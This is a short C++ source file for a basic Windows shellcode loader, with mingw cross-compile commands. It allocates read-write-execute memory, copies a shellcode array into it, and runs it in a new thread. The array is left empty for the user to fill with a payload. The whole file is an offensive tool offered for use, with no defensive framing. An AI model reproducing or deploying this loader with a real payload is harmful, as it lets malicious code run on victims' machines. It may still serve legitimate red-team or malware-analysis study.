// A very basic loader
// compile on linux with:
// 32bit: `i686-w64-mingw32-g++ basic-loader.cpp -o basic-loader32.exe`
// 64bit: `x86_64-w64-mingw32-g++ basic-loader.cpp -o basic-loader.exe`

#include <iostream>
#include <windows.h>

// shellcode here
unsigned char shellcode[] = "";


int main(){

	// allocate memory for shellcode
	void* address = VirtualAlloc(
		NULL,
		sizeof shellcode,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	// copy shellcode to allocated memory
	CopyMemory(address, shellcode, sizeof shellcode);

	// declare thread used for execution
	HANDLE hThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)address,
		NULL,
		0,
		NULL);

	// wait for thread to complete
	WaitForSingleObject(hThread, -1);
	CloseHandle(hThread);

	return 0;
}